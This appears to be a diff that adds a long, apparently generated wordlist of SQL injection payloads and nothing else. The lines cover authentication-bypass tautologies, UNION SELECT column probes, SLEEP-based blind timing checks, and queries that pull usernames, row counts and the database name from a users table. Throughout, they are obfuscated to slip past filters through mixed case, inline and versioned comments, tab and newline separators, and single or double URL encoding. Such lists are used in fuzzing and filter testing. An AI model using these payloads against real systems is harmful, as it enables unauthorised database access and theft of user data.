+%27%0Aor%0A%28Select%0AGROUP_CONCAT%28username%29%0AfrOM%0Ausers%29%0A--
+%27%0AoR%0A%28SelE/%2AranDom%2A/cT%0ACOUNT%28%2A%29%0Afro%23M%0Ausers%29%3E0%0A--
+%27%0AoR%0A%28seLeCt%0ACOUNT%28%2A%29%0AfrO/%2Arandom%2A/m%0Ausers%29%3E0%0A--
+%27%2509UniOn%2509SELeCT%25091%2C2%2C3%2509--
+%27%09Or%09%28s%23eLecT%09COUNT%28%2A%29%09Fro--M%09users%29%3E0%09--
+'%09oR%09IF(1=1,SL--EEP(5),0)%09--
+'%09UnioN%09selEct%091,2,3%09--
+%27%250aOR%250a1%3D1%250a--
+'	uniOn	s/*!50000*/eLECt	1,2,3	--
+'%09oR%09(seLEct%09COUNT(*)%09Fr/*random*/Om%09users)>0%09--
+'	or	IF(1=1,SLEEp(5),0)	--
+' oR IF(1=1,sLee#p(5),0) --
+%27%2509or%2509%28selE--CT%2509GROUP_CONCAT%28username%29%2509fro/%2A%2A/m%2509users%29%2509--
+'
+OR
+(SElEc/**/T
+GROUP_CONCAT(username)
+fRom
+users)
+--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+'	oR	(sELect	GROUP_CONCAT(username)	fr/*!50000*/OM	users)	--
+%27%0Aor%0A%27a%27%3D%27a%27%0A--
+'%0aOr%0aex--isTS(Se/*rANDom*/lEct%0a*%0aFr/*!50000*/om%0ausers)%0a--
+'
+OR
+(s/*raN/*random*/dom*/ElECT
+COUNT(*)
+FR/*random*/Om
+users)>0
+--
+'%0aor%0aEXisTs(SEl/*!50000*/ECt%0a*%0aF--roM%0ausers)%0a--
+%27%20or%20%28SELEcT%20GROUP_CONCAT%28username%29%20From%20users%29%20--
+%27%0AoR%0A%28SElEc%23T%0Adatabase%28%29%29%0A--
+'
+or
+1=1
+--
+'%09or%09IF(1=1,sLee/**/P(5),0)%09--
+' Or eXisTs(S#EleCT * FR/*random*/om users) --
+%27%250auniON%250aselEct%250a1%2C2%2C3%250a--
+'%0aOr%0a(SELEC/*!50000*/T%0aGROUP_CONCAT(username)%0aFRom%0ausers)%0a--
+%27%2509or%2509%28SeLeCt%2509COUNT%28%2A%29%2509F/%2A%2A/rom%2509users%29%3E0%2509--
+%27%2509oR%25091%3D1%2509--
+'	or	ExiST--S(sE--LECT	*	fROm	users)	--
+'
+oR
+'a'='a'
+--
+'	u/*!50000*/NiOn	S/*ran/**/Dom*/Elect	1,2,3	--
+%27%09or%09IF%281%3D1%2CslEEp%285%29%2C0%29%09--
+%27%20OR%20IF%281%3D1%2CSLeEP%285%29%2C0%29%20--
+' Or 'a'='a' --
+%27%2509or%2509%28seL/%2A%2150000%2A/Ect%2509COUNT%28%2A%29%2509fROM%2509users%29%3E0%2509--
+'
+oR
+exIsts(sel#EcT
+*
+FRO/**/M
+users)
+--
+' or (SE#lECt GROUP_CONCAT(username) f/**/Rom users) --
+%27%0AoR%0AIF%281%3D1%2CslE--Ep%285%29%2C0%29%0A--
+%27%2509oR%2509%28s/%2A%2150000%2A/ElEcT%2509GROUP_CONCAT%28username%29%2509Fro/%2A%2A/M%2509users%29%2509--
+'%0aor%0aEXi/*!50000*/sTS(sEL/**/ECT%0a*%0af/**/Rom%0ausers)%0a--
+'%09unION%09seleCt%091,2,3%09--
+%27%0AOR%0AEx/%2A%2A/Ists%28SE/%2A%2A/lect%0A%2A%0AfRo%23m%0Ausers%29%0A--
+'	Or	(S/*rANDom*/ELECt	database())	--
+%27%20UNioN%20sElECT%201%2C2%2C3%20--
+' oR (Se#LECt database()) --
+%27%20oR%20%28seLECT%20database%28%29%29%20--
+'	uN/*!50000*/IoN	sE#LeCT	1,2,3	--
+'	Or	Exis/*!50000*/ts(se--LEct	*	FrO/**/m	users)	--
+'
+OR
+exisTS(SEl/*rAN/*random*/dom*/ecT
+*
+Fr/*random*/om
+users)
+--
+%27%250aor%250a%28sELE/%2AranDom%2A/ct%250adatabase%28%29%29%250a--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+'
+oR
+(selecT
+COUNT(*)
+froM
+users)>0
+--
+'%0aor%0a(Se--LecT%0aCOUNT(*)%0afR/*!50000*/oM%0ausers)>0%0a--
+%27%0Aor%0A1%3D1%0A--
+'%0aUnion%0asE/*!50000*/Lect%0a1,2,3%0a--
+%27%2509OR%2509%28SELEcT%2509GROUP_CONCAT%28username%29%2509FR/%2A%2A/Om%2509users%29%2509--
+'
+oR
+IF(1=1,sLeeP(5),0)
+--
+%27%250aUnI--ON%250aSELeCT%250a1%2C2%2C3%250a--
+%27%250aOr%250a%28seL/%2A%2150000%2A/Ect%250aCOUNT%28%2A%29%250aF/%2A%2150000%2A/ROM%250ausers%29%3E0%250a--
+%27%2509Or%2509%27a%27%3D%27a%27%2509--
+%27%250aOr%250a%27a%27%3D%27a%27%250a--
+%27%20or%20%28s/%2A%2150000%2A/EleCt%20GROUP_CONCAT%28username%29%20F/%2A%2150000%2A/rOM%20users%29%20--
+'	Or	(seleCT	database())	--
+'
+or
+(SElecT
+COUNT(*)
+FRO/*!50000*/m
+users)>0
+--
+%27%09uNIOn%09sElEct%091%2C2%2C3%09--
+%27%250aOR%250a1%3D1%250a--
+'	OR	eXIsTs(SeleCt	*	FrOm	users)	--
+%27%09oR%09IF%281%3D1%2CsLEeP%285%29%2C0%29%09--
+%27%0AOR%0A1%3D1%0A--
+'%0auNIo#n%0aSElEc/*rAndom*/t%0a1,2,3%0a--
+%27%2509or%2509eX/%2Arandom%2A/IStS%28selecT%2509%2A%2509frOm%2509users%29%2509--
+'%09UNiOn%09SeLeCT%091,2,3%09--
+'	OR	1=1	--
+'%0aOr%0a1=1%0a--
+'%0auNI/*!50000*/ON%0asELEcT%0a1,2,3%0a--
+%27%09Or%09%28sELECt%09GROUP_CONCAT%28username%29%09f/%2Arandom%2A/rom%09users%29%09--
+'%0aOr%0a(sE--lect%0aGROUP_CONCAT(username)%0afROM%0ausers)%0a--
+%27%0AOr%0AIF%281%3D1%2CS/%2A%2A/LeEp%285%29%2C0%29%0A--
+'%09Or%09ExiSTS(SeleCt%09*%09From%09users)%09--
+%27%2509or%2509IF%281%3D1%2CsleEp%285%29%2C0%29%2509--
+%27%2509union%2509SeLeC/%2A%2A/t%25091%2C2%2C3%2509--
+'
+Or
+(SeLECT
+COUNT(*)
+fROm
+users)>0
+--
+%27%09or%09IF%281%3D1%2CsleeP%285%29%2C0%29%09--
+%27%2509Or%2509%28SE/%2A%2A/lEct%2509GROUP_CONCAT%28username%29%2509FRoM%2509users%29%2509--
+%27%20Or%201%3D1%20--
+' or IF(1=1,Sle--eP(5),0) --
+'	Or	IF(1=1,SlEEp(5),0)	--
+'%0aOR%0a(sELEcT%0aCOUNT(*)%0afroM%0ausers)>0%0a--
+%27%250aor%250a%28sel/%2A%2A/EcT%250aGROUP_CONCAT%28username%29%250aF--ROm%250ausers%29%250a--
+'
+oR
+(seleCt
+database())
+--
+%27%250aor%250a%28sELE/%2A%2150000%2A/ct%250aGROUP_CONCAT%28username%29%250afRom%250ausers%29%250a--
+' Or (Se/*ranDom*/LEcT database()) --
+%27%2509or%2509%28sELect%2509GROUP_CONCAT%28username%29%2509FRo--m%2509users%29%2509--
+'%0aOr%0a1=1%0a--
+%27%09OR%09%28SElEC/%2AraNDom%2A/t%09database%28%29%29%09--
+' Or IF(1=1,SlEEp(5),0) --
+'%0aOr%0a1=1%0a--
+'%0aOr%0aE--xIsTs(sEleC#t%0a*%0afROM%0ausers)%0a--
+'%09Or%09'a'='a'%09--
+%27%250aor%250a%28sELe--Ct%250aGROUP_CONCAT%28username%29%250afRom%250ausers%29%250a--
+'
+Or
+exiStS(s/**/ElecT
+*
+fRo/**/M
+users)
+--
+'%09OR%09ExIStS(sELec/**/t%09*%09f#rom%09users)%09--
+%27%0AoR%0A%28SeLeCT%0AGROUP_CONCAT%28username%29%0AfroM%0Ausers%29%0A--
+'	or	e/**/XiSts(SELECT	*	F#rOm	users)	--
+'
+OR
+(sEL#EcT
+COUNT(*)
+fRo/*random*/m
+users)>0
+--
+'%0aor%0aEX/*random*/iSTs(se/*!50000*/lECt%0a*%0af--ROm%0ausers)%0a--
+'%0aUNIoN%0aSeLecT%0a1,2,3%0a--
+%27%2509oR%25091%3D1%2509--
+%27%250aOR%250a%28seLECt%250aCOUNT%28%2A%29%250afROm%250ausers%29%3E0%250a--
+'%0au/**/nIoN%0aSeLE#ct%0a1,2,3%0a--
+'%0aOr%0a(SeLECt%0aGROUP_CONCAT(username)%0afRo/*random*/M%0ausers)%0a--
+'	uNIoN	s--eleCT	1,2,3	--
+%27%250aoR%250a%28sEL%23ect%250aGROUP_CONCAT%28username%29%250aFROM%250ausers%29%250a--
+%27%250aUNIO--N%250asElect%250a1%2C2%2C3%250a--
+'%0auNiON%0as#EleCt%0a1,2,3%0a--
+%27%250aOR%250aIF%281%3D1%2CSLEE/%2Arandom%2A/P%285%29%2C0%29%250a--
+'%09oR%09(sELECt%09database())%09--
+'	Or	(seLECT	database())	--
+%27%250aor%250aIF%281%3D1%2CslEep%285%29%2C0%29%250a--
+%27%09uniON%09sE%23LEct%091%2C2%2C3%09--
+'
+UNIOn
+seLEct
+1,2,3
+--
+'	OR	'a'='a'	--
+%27%0Aor%0A%28seleCT%0ACOUNT%28%2A%29%0AFRoM%0Ausers%29%3E0%0A--
+' OR (SeLECt COUNT(*) FROM users)>0 --
+%27%20Or%20IF%281%3D1%2CSlEE/%2Arandom%2A/p%285%29%2C0%29%20--
+'	or	IF(1=1,sLeEP(5),0)	--
+'%0aor%0a(seleCT%0aGROUP_CONCAT(username)%0aFROM%0ausers)%0a--
+'
+oR
+(se/**/lect
+GROUP_CONCAT(username)
+fRo/*!50000*/M
+users)
+--
+'	oR	(S/*!50000*/ElECt	COUNT(*)	fR/**/Om	users)>0	--
+%27%2509OR%25091%3D1%2509--
+'
+OR
+1=1
+--
+'
+UNiOn
+seL--ECt
+1,2,3
+--
+'%0auNiON%0aSELecT%0a1,2,3%0a--
+' Or 1=1 --
+%27%20oR%20IF%281%3D1%2CSleep%285%29%2C0%29%20--
+' oR (sEL/*raN/**/dom*/EcT GROUP_CONCAT(username) F--rOm users) --
+'%09oR%09eXiSts(sELeCt%09*%09fROM%09users)%09--
+%27%09Or%09eX/%2Arandom%2A/iSts%28sELECt%09%2A%09fROM%09users%29%09--
+'	OR	IF(1=1,sle--Ep(5),0)	--
+'%0aUNIoN%0aselECT%0a1,2,3%0a--
+'
+OR
+'a'='a'
+--
+%27%09oR%09IF%281%3D1%2CsLee/%2Arandom%2A/P%285%29%2C0%29%09--
+' oR E/*!50000*/XisTS(sElecT * FrOm users) --
+'
+Or
+1=1
+--
+'
+OR
+Exis--TS(SeleCt
+*
+Fro--M
+users)
+--
+'	or	(sele/**/CT	COUNT(*)	fROm	users)>0	--
+%27%0AOR%0A%27a%27%3D%27a%27%0A--
+%27%2509or%2509IF%281%3D1%2CsleE/%2Arandom%2A/p%285%29%2C0%29%2509--
+'
+UNION
+sElEct
+1,2,3
+--
+'%09Or%09(SelEC--t%09GROUP_CONCAT(username)%09FrOm%09users)%09--
+'
+or
+eXis/*!50000*/ts(SEleCt
+*
+FROM
+users)
+--
+' Or 1=1 --
+' Or (seLEct COUNT(*) frOm users)>0 --
+%27%2509or%2509%28S/%2ArAn/%2A%2150000%2A/Dom%2A/eLeCT%2509GROUP_CONCAT%28username%29%2509FrO/%2A%2150000%2A/M%2509users%29%2509--
+%27%20OR%201%3D1%20--
+%27%250aOr%250a%28SeLEc%23t%250aGROUP_CONCAT%28username%29%250afrO/%2Arandom%2A/M%250ausers%29%250a--
+%27%20oR%20existS%28SEl%23Ect%20%2A%20f/%2Arandom%2A/rom%20users%29%20--
+'%09or%091=1%09--
+'%0aOr%0a'a'='a'%0a--
+' u/**/nIon selEc/**/t 1,2,3 --
+' uNIoN Select 1,2,3 --
+%27%0Aor%0A%28SE%23lECt%0AGROUP_CONCAT%28username%29%0AFr/%2A%2A/OM%0Ausers%29%0A--
+'%09OR%091=1%09--
+%27%2509OR%2509%28SElECt%2509database%28%29%29%2509--
+%27%0Aor%0A%28SeLEct%0Adatabase%28%29%29%0A--
+'	or	ExISts(select	*	frOm	users)	--
+'%09uNI/*random*/ON%09sElEcT%091,2,3%09--
+%27%250aOr%250a%27a%27%3D%27a%27%250a--
+'%0aoR%0aexISts(S/*!50000*/elECT%0a*%0afro/*random*/M%0ausers)%0a--
+'	Or	1=1	--
+'
+Or
+'a'='a'
+--
+%27%09or%09IF%281%3D1%2CsLEEp%285%29%2C0%29%09--
+' oR exiSts(SeLect * fROM users) --
+'
+Or
+(SeLeC/*raN--dom*/T
+COUNT(*)
+FroM
+users)>0
+--
+%27%0AUNION%0AsElec/%2A%2150000%2A/t%0A1%2C2%2C3%0A--
+%27%250aoR%250a1%3D1%250a--
+' or (sELe#CT GROUP_CONCAT(username) frO/*random*/M users) --
+%27%2509uNiOn%2509sElEct%25091%2C2%2C3%2509--
+%27%0AoR%0A1%3D1%0A--
+%27%09Or%09%28SE%23LEcT%09GROUP_CONCAT%28username%29%09FRO/%2A%2150000%2A/m%09users%29%09--
+%27%09oR%09%27a%27%3D%27a%27%09--
+'%09or%091=1%09--
+%27%20UnIO/%2A%2150000%2A/n%20SeLect%201%2C2%2C3%20--
+'%0aOr%0a(Sel--EcT%0adatabase())%0a--
+%27%09OR%09%28SELEcT%09GROUP_CONCAT%28username%29%09FroM%09users%29%09--
+'%0aoR%0a1=1%0a--
+'%09OR%091=1%09--
+'
+oR
+(seLecT
+database())
+--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+%27%250aOr%250a1%3D1%250a--
+%27%09Or%091%3D1%09--
+'	Or	(sElecT	database())	--
+%27%20or%20%28seleCT%20GROUP_CONCAT%28username%29%20fro/%2A%2A/m%20users%29%20--
+'	Un--iON	sE/*ran#dom*/LEct	1,2,3	--
+'	uN--ioN	seL/**/Ect	1,2,3	--
+'%0aor%0a'a'='a'%0a--
+%27%09oR%09%28SELECT%09database%28%29%29%09--
+'%09or%09IF(1=1,sleep(5),0)%09--
+' or (select database()) --
+%27%2509Or%2509IF%281%3D1%2CSlEEp%285%29%2C0%29%2509--
+'
+OR
+1=1
+--
+'%0aor%0a'a'='a'%0a--
+' oR (se/**/lecT COUNT(*) fRo/*!50000*/m users)>0 --
+'%09oR%09IF(1=1,SleEp(5),0)%09--
+'%0aoR%0a(SeLeCt%0adatabase())%0a--
+' OR 'a'='a' --
+'	or	(seLecT	COUNT(*)	From	users)>0	--
+'%09Or%09(SeLe/*!50000*/CT%09GROUP_CONCAT(username)%09From%09users)%09--
+'	oR	(SELECT	COUNT(*)	FRo/**/M	users)>0	--
+%27%20Or%20%27a%27%3D%27a%27%20--
+'%0aor%0aIF(1=1,Sl/*!50000*/eep(5),0)%0a--
+' Or IF(1=1,SlEep(5),0) --
+'%0aOR%0a(sELe/*!50000*/CT%0aCOUNT(*)%0aFro/*random*/m%0ausers)>0%0a--
+'%09OR%09(SeLECT%09database())%09--
+%27%0AOR%0A1%3D1%0A--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+%27%250aUn/%2Aran/%2Arandom%2A/Dom%2A/iOn%250aSElECT%250a1%2C2%2C3%250a--
+'
+OR
+exiStS(SelE/**/CT
+*
+FROm
+users)
+--
+' or EXiStS(selEct * FROm users) --
+'	or	(SelEct	COUNT(*)	fRoM	users)>0	--
+%27%250aOr%250a1%3D1%250a--
+%27%250aoR%250a%28SelecT%250adatabase%28%29%29%250a--
+%27%09oR%09%27a%27%3D%27a%27%09--
+%27%20unioN%20SEl%23eCt%201%2C2%2C3%20--
+' oR ex/**/ISTS(sELecT * F--rOM users) --
+'%09or%09'a'='a'%09--
+%27%09oR%09%28sElECt%09GROUP_CONCAT%28username%29%09F/%2Arandom%2A/Rom%09users%29%09--
+%27%2509Or%2509%28SeLEc/%2A%2A/T%2509database%28%29%29%2509--
+' or (SeLEct COUNT(*) f/*random*/ROM users)>0 --
+%27%0AOr%0A1%3D1%0A--
+'%0aor%0a(SeLEct%0aCOUNT(*)%0aFr/*random*/OM%0ausers)>0%0a--
+'	oR	(SelECt	COUNT(*)	FRoM	users)>0	--
+' UnIO#n sEL/*!50000*/Ect 1,2,3 --
+' oR (SelecT GROUP_CONCAT(username) fRo/*!50000*/m users) --
+%27%09UnioN%09sELEct%091%2C2%2C3%09--
+'%0aOr%0aeXIs#Ts(SELECT%0a*%0afRoM%0ausers)%0a--
+%27%2509oR%2509%27a%27%3D%27a%27%2509--
+' Or 'a'='a' --
+%27%250aOR%250aIF%281%3D1%2CSLEEP%285%29%2C0%29%250a--
+%27%0AOr%0A%28seLecT%0Adatabase%28%29%29%0A--
+%27%09oR%09%28SELECt%09database%28%29%29%09--
+'%09oR%09(sELEcT%09database())%09--
+%27%09OR%09%27a%27%3D%27a%27%09--
+'%09oR%09IF(1=1,SlEeP(5),0)%09--
+'%09OR%09(SEleC/**/T%09COUNT(*)%09F/*!50000*/RoM%09users)>0%09--
+'%09unIoN%09SEleCT%091,2,3%09--
+%27%20OR%20%27a%27%3D%27a%27%20--
+'	Or	IF(1=1,sleep(5),0)	--
+%27%20or%20IF%281%3D1%2CsL/%2Arandom%2A/eeP%285%29%2C0%29%20--
+'	OR	(SelECT	GROUP_CONCAT(username)	f--roM	users)	--
+'%09oR%09exI#STS(s#eLECT%09*%09F/*!50000*/rom%09users)%09--
+%27%09OR%09%27a%27%3D%27a%27%09--
+'
+oR
+EX/**/isTS(SelECt
+*
+fROm
+users)
+--
+'	UnIO/*!50000*/N	SEL/*rAN/**/Dom*/Ect	1,2,3	--
+'%0aOr%0aex--Ists(SeLecT%0a*%0af#roM%0ausers)%0a--
+'
+oR
+eXIStS(seL/**/eCt
+*
+FROM
+users)
+--
+'%09Or%09(sElEcT%09COUNT(*)%09F/*!50000*/rOm%09users)>0%09--
+' Or (SeLect COUNT(*) From users)>0 --
+' Or (SeLe/*rAnDom*/CT GROUP_CONCAT(username) FROm users) --
+%27%0Aor%0A%28seleC/%2ArAndom%2A/T%0ACOUNT%28%2A%29%0Afrom%0Ausers%29%3E0%0A--
+' Or 1=1 --
+'	oR	(seleCt	GROUP_CONCAT(username)	fr#OM	users)	--
+'%09OR%09'a'='a'%09--
+'
+oR
+'a'='a'
+--
+%27%250aOr%250a%28sEle%23Ct%250adatabase%28%29%29%250a--
+'
+or
+EXIs#TS(SelECT
+*
+fr/**/OM
+users)
+--
+' unIon SeLECT 1,2,3 --
+%27%250aOR%250a%28SELeCt%250adatabase%28%29%29%250a--
+%27%250aOR%250a%28SE%23lecT%250adatabase%28%29%29%250a--
+%27%250aoR%250a%27a%27%3D%27a%27%250a--
+' Or eXiSts(selecT * fROm users) --
+'	OR	IF(1=1,sLEeP(5),0)	--
+'	oR	'a'='a'	--
+'%09Or%09(SeLeCT%09database())%09--
+'	oR	'a'='a'	--
+%27%250aunION%250aselect%250a1%2C2%2C3%250a--
+'	unIO--N	SeL/*rAndom*/eCT	1,2,3	--
+' UNIon selECT 1,2,3 --
+' Or eXi#sTS(sElEcT * FrO--m users) --
+'%09oR%09(sel--eCt%09database())%09--
+%27%20unioN%20SEle/%2A%2150000%2A/ct%201%2C2%2C3%20--
+'%09Or%091=1%09--
+%27%250aUNIon%250aSEleCT%250a1%2C2%2C3%250a--
+%27%0Aor%0A1%3D1%0A--
+%27%20oR%20%28Se/%2A%2150000%2A/LECT%20database%28%29%29%20--
+%27%0AUnio--n%0ASeLEC/%2A%2150000%2A/T%0A1%2C2%2C3%0A--
+'
+or
+(Se/*ra#ndom*/lecT
+GROUP_CONCAT(username)
+FR#om
+users)
+--
+'
+or
+Exi/*!50000*/STS(SELec/*ra/**/nDom*/T
+*
+fROm
+users)
+--
+'
+or
+'a'='a'
+--
+' OR 1=1 --
+' or IF(1=1,sLEEP(5),0) --
+'	or	EXiStS(sELEcT	*	fRoM	users)	--
+' Or (sElecT COUNT(*) FrOm users)>0 --
+' OR IF(1=1,SLeEp(5),0) --
+%27%0AOr%0A%27a%27%3D%27a%27%0A--
+'	or	1=1	--
+'	oR	'a'='a'	--
+'
+oR
+(sE/**/lecT
+COUNT(*)
+F#ROM
+users)>0
+--
+%27%0AOR%0A%27a%27%3D%27a%27%0A--
+'	oR	'a'='a'	--
+'	OR	1=1	--
+%27%09oR%09%28sele/%2A%2150000%2A/CT%09GROUP_CONCAT%28username%29%09fRO/%2Arandom%2A/m%09users%29%09--
+%27%250aOR%250aIF%281%3D1%2CSl/%2A%2150000%2A/eeP%285%29%2C0%29%250a--
+'	oR	'a'='a'	--
+%27%250aUNiON%250asele/%2A%2150000%2A/Ct%250a1%2C2%2C3%250a--
+'	oR	'a'='a'	--
+%27%09oR%09%28sEl%23eCt%09GROUP_CONCAT%28username%29%09FR/%2A%2A/oM%09users%29%09--
+'%09or%091=1%09--
+%27%2509Or%2509IF%281%3D1%2Csl/%2A%2150000%2A/eEP%285%29%2C0%29%2509--
+'	Or	1=1	--
+'	OR	eXiSTs(seleCT	*	FroM	users)	--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+'%09oR%09(SE--LeCT%09GROUP_CONCAT(username)%09f/*!50000*/rom%09users)%09--
+'%09Or%091=1%09--
+'%0aor%0a(seL--ect%0adatabase())%0a--
+'
+Or
+1=1
+--
+'%0aor%0a'a'='a'%0a--
+'%09OR%09IF(1=1,sLeEP(5),0)%09--
+' Or (SEle--ct COUNT(*) fROM users)>0 --
+%27%20or%20IF%281%3D1%2CSLEEP%285%29%2C0%29%20--
+%27%20OR%20%28sEleCt%20COUNT%28%2A%29%20fRO/%2A%2150000%2A/M%20users%29%3E0%20--
+%27%20Or%20IF%281%3D1%2CsLeeP%285%29%2C0%29%20--
+'	OR	(SeleCt	database())	--
+' OR EXIsTs(seleCt * Fr/**/Om users) --
+'
+OR
+'a'='a'
+--
+'%0aor%0a(seleCt%0adatabase())%0a--
+'	Or	ExiSts(SelEct	*	fr/*random*/om	users)	--
+'%0aOr%0a(SE/**/lEcT%0adatabase())%0a--
+%27%2509OR%2509%28SeLEC/%2A%2A/T%2509COUNT%28%2A%29%2509f/%2Arandom%2A/ROm%2509users%29%3E0%2509--
+%27%09oR%09%27a%27%3D%27a%27%09--
+%27%09union%09sElECt%091%2C2%2C3%09--
+' oR (SELec--T GROUP_CONCAT(username) From users) --
+' or 'a'='a' --
+'	u/*!50000*/nIoN	SeLecT	1,2,3	--
+'
+Or
+exi/*!50000*/sTS(sel/**/ect
+*
+FrOm
+users)
+--
+'%09Or%09(SeLEcT%09GROUP_CONCAT(username)%09f/*random*/rOm%09users)%09--
+' or (seL/**/eCt GROUP_CONCAT(username) FroM users) --
+'
+UN/*raNDom*/Ion
+SELECT
+1,2,3
+--
+'	Or	IF(1=1,s/**/LeEp(5),0)	--
+'	oR	(s#ELECt	GROUP_CONCAT(username)	frOM	users)	--
+'	Or	'a'='a'	--
+'%09oR%09IF(1=1,SLEep(5),0)%09--
+'	oR	'a'='a'	--
+'	Or	(s/*rA/*random*/NDom*/ELECT	database())	--
+'%0aoR%0a1=1%0a--
+%27%2509Or%2509%27a%27%3D%27a%27%2509--
+'%0aOr%0a1=1%0a--
+'
+or
+IF(1=1,S/*random*/lEeP(5),0)
+--
+'
+Or
+(Sel/*rANDom*/ECt
+database())
+--
+'%09Or%09exisTS(SELecT%09*%09fRom%09users)%09--
+'
+OR
+1=1
+--
+'	or	ExisTs(seleCt	*	FroM	users)	--
+%27%09union%09s--eLECt%091%2C2%2C3%09--
+%27%20or%20%27a%27%3D%27a%27%20--
+'
+oR
+(SELect
+database())
+--
+'%09unIo/*rANDom*/N%09Se/**/LECT%091,2,3%09--
+'
+Or
+1=1
+--
+'%0aoR%0aExIsTS(sEL#ECT%0a*%0afroM%0ausers)%0a--
+'
+uniON
+Se--LEct
+1,2,3
+--
+%27%0AOr%0AIF%281%3D1%2CSLeep%285%29%2C0%29%0A--
+%27%20OR%20Exists%28SELect%20%2A%20FRom%20users%29%20--
+'	OR	IF(1=1,SlE/*!50000*/ep(5),0)	--
+'
+OR
+(Se/*!50000*/lEcT
+COUNT(*)
+FR/**/Om
+users)>0
+--
+%27%2509OR%2509%28sEL/%2A%2A/ECt%2509GROUP_CONCAT%28username%29%2509F/%2A%2A/ROm%2509users%29%2509--
+'%09OR%09(sELe/*!50000*/cT%09database())%09--
+'%0aOr%0a(SElec/*rAN/*random*/dom*/T%0aGROUP_CONCAT(username)%0aF/**/ROM%0ausers)%0a--
+%27%0Aor%0AEXiST/%2A%2150000%2A/S%28sElect%0A%2A%0AFRom%0Ausers%29%0A--
+' OR (SeLeCT GROUP_CONCAT(username) Fro/*!50000*/m users) --
+'%0aOr%0aIF(1=1,Sle/*!50000*/eP(5),0)%0a--
+'	OR	1=1	--
+%27%20oR%20eXISTS%28SELEct%20%2A%20fROm%20users%29%20--
+%27%20or%20%28SELEct%20COUNT%28%2A%29%20FRo/%2Arandom%2A/m%20users%29%3E0%20--
+'	OR	'a'='a'	--
+'
+or
+(se/*!50000*/LeCt
+database())
+--
+'%0aor%0a(Sel/*!50000*/ECT%0adatabase())%0a--
+'%09u--NIon%09SelecT%091,2,3%09--
+'	oR	(SElect	GROUP_CONCAT(username)	FR#OM	users)	--
+'%0aoR%0aexiStS(sELEct%0a*%0afRoM%0ausers)%0a--
+' oR 1=1 --
+'
+oR
+(sELeCT
+database())
+--
+'%0aor%0a(sElECT%0aGROUP_CONCAT(username)%0afROm%0ausers)%0a--
+%27%09UNIon%09SeLEc--T%091%2C2%2C3%09--
+' or (selECT database()) --
+'%0aoR%0a(SElec--T%0aCOUNT(*)%0afrOM%0ausers)>0%0a--
+'
+OR
+IF(1=1,SleE/*!50000*/p(5),0)
+--
+'
+OR
+1=1
+--
+%27%2509Or%2509%28sE/%2AraNDom%2A/lect%2509COUNT%28%2A%29%2509FR/%2Arandom%2A/om%2509users%29%3E0%2509--
+'	OR	(sElECT	GROUP_CONCAT(username)	FROm	users)	--
+' OR (SelECt database()) --
+%27%20oR%20%28SEleCT%20COUNT%28%2A%29%20frO%23m%20users%29%3E0%20--
+'
+unio--n
+SELE/*!50000*/Ct
+1,2,3
+--
+'
+or
+(Select
+COUNT(*)
+frOM
+users)>0
+--
+'	OR	'a'='a'	--
+%27%250aOR%250a%28Select%250aCOUNT%28%2A%29%250af--roM%250ausers%29%3E0%250a--
+'%0aOr%0aeXIsts(sElecT%0a*%0aFr/*random*/OM%0ausers)%0a--
+'%09Or%09(se/*!50000*/LecT%09GROUP_CONCAT(username)%09fRom%09users)%09--
+%27%250aor%250aexISTS%28s/%2A%2A/elECT%250a%2A%250aFr--OM%250ausers%29%250a--
+'	oR	(SElEcT	GROUP_CONCAT(username)	Fr/*!50000*/oM	users)	--
+%27%0AUnIoN%0AsELecT%0A1%2C2%2C3%0A--
+'	or	(Sel--EcT	COUNT(*)	Fro/*!50000*/m	users)>0	--
+'	OR	IF(1=1,SleEP(5),0)	--
+%27%20or%20%27a%27%3D%27a%27%20--
+%27%0AOr%0A%28SelecT%0Adatabase%28%29%29%0A--
+' OR 'a'='a' --
+%27%20OR%201%3D1%20--
+'%0aOr%0a1=1%0a--
+'%0aOr%0a(selEct%0aGROUP_CONCAT(username)%0afROM%0ausers)%0a--
+%27%250aoR%250a%28selE/%2A%2A/ct%250aGROUP_CONCAT%28username%29%250afrOM%250ausers%29%250a--
+%27%0AoR%0A%28SelEcT%0AGROUP_CONCAT%28username%29%0AFrOM%0Ausers%29%0A--
+%27%09union%09SElecT%091%2C2%2C3%09--
+%27%20oR%20%28S/%2A%2A/Elect%20database%28%29%29%20--
+'
+oR
+(SElECt
+database())
+--
+'
+UNIOn
+Sel/*ra--nDom*/ect
+1,2,3
+--
+'
+OR
+'a'='a'
+--
+'%09Or%09(SeLec/*rAnDom*/t%09GROUP_CONCAT(username)%09From%09users)%09--
+%27%09OR%091%3D1%09--
+'%0aOr%0a'a'='a'%0a--
+' or 1=1 --
+'%09Or%091=1%09--
+%27%0AUNION%0ASE%23lect%0A1%2C2%2C3%0A--
+'%0aoR%0a'a'='a'%0a--
+'%0aoR%0a(S/*!50000*/ELect%0aGROUP_CONCAT(username)%0af--ROm%0ausers)%0a--
+' or (sElE#CT database()) --
+' or IF(1=1,slEEP(5),0) --
+'
+oR
+(S#ElECT
+database())
+--
+%27%250aor%250a%28sE--Lect%250aGROUP_CONCAT%28username%29%250aFrOm%250ausers%29%250a--
+'
+or
+eXi/*!50000*/sTS(s/*!50000*/EleCT
+*
+frO--M
+users)
+--
+%27%0Aor%0A%27a%27%3D%27a%27%0A--
+'	Or	1=1	--
+'%0aunI#on%0asElec/**/T%0a1,2,3%0a--
+%27%2509or%2509%27a%27%3D%27a%27%2509--
+%27%250aOr%250a1%3D1%250a--
+'
+Or
+(sEleCT
+database())
+--
+'%0aUn--iOn%0aS/*!50000*/EleCt%0a1,2,3%0a--
+%27%0AoR%0A%28SeLecT%0AGROUP_CONCAT%28username%29%0AFrO/%2A%2150000%2A/m%0Ausers%29%0A--
+%27%09OR%09%28SEle%23Ct%09COUNT%28%2A%29%09FrO/%2A%2150000%2A/M%09users%29%3E0%09--
+'	OR	(seleCt	GROUP_CONCAT(username)	FROM	users)	--
+%27%20Or%20%28s/%2A%2A/ELEcT%20COUNT%28%2A%29%20FROm%20users%29%3E0%20--
+'	OR	1=1	--
+'%09oR%09(sEl/*!50000*/eCt%09GROUP_CONCAT(username)%09frOm%09users)%09--
+' union Sel#EcT 1,2,3 --
+'
+or
+(sEleCT
+GROUP_CONCAT(username)
+FRO--m
+users)
+--
+'	or	(SEleCt	GROUP_CONCAT(username)	fRom	users)	--
+'	Or	'a'='a'	--
